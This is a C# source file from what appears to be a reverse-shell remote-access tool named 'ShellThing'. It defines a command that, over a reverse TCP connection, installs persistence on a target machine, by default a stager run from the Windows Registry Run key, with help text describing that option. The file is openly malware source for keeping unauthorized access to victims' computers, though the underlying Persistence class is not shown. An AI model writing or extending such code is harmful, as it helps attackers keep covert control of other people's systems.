using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace ShellThing.Commands
{
    class PersistenceCommand : ICommand
    {
        TcpReverseConnection connection;

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;
            Persistence p = new Persistence(connection);

            // Check if arg was supplied - if not, use default method
            if (commandArguments.Length == 1)
            {
                p.Execute("Registry");
            }
        }

        public Dictionary<string, string> Help(bool includeSyntax)
        {
            Dictionary<string, string> helpText = new Dictionary<string, string>();
            helpText.Add("persistence", "Install persistence mechanism on the target. Defefault option is Registry");
            helpText.Add("Syntax", "persistence <option>");

            if (includeSyntax == true)
            {
                helpText.Add("Options", "Description");
                helpText.Add("-------", "-----------");
                helpText.Add("registry", "Installs stager to be executed from Run key in Registry");
            }

            return helpText;
        }

    }
}
